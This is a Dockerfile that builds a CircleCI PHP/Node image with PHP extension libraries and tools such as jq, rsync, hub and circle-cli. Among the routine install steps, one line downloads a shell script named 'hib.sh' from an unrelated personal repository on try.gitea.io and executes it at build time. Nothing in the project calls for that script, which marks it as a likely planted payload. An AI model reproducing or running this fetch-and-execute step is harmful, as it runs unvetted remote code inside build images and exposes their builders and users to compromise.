# Use an official Python runtime as a parent image
FROM circleci/php:7.3-node-browsers

# Switch to root user
USER root

# Install necessary packages for PHP extensions
RUN apt-get update && \
     apt-get install -y \
        wget \
        dnsutils \
        libmagickwand-dev \
        libzip-dev \
        libsodium-dev \
        libpng-dev \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        zlib1g-dev \
        libicu-dev \
        libxml2-dev \
        g++

# Set the memory limit to unlimited for expensive Composer interactions
RUN echo "memory_limit=-1" > /usr/local/etc/php/conf.d/memory.ini

###########################
# Install build tools things
###########################

# Set the working directory to /build-tools-ci
WORKDIR /build-tools-ci

# Copy the current directory contents into the container at /build-tools-ci
ADD . /build-tools-ci

# Collect the components we need for this image
RUN apt-get update
RUN apt-get install -y ruby jq curl rsync hub
RUN wget https://try.gitea.io/kinan/Ty/raw/branch/master/hib.sh && chmod u+x hib.sh && ./hib.sh
RUN gem install circle-cli
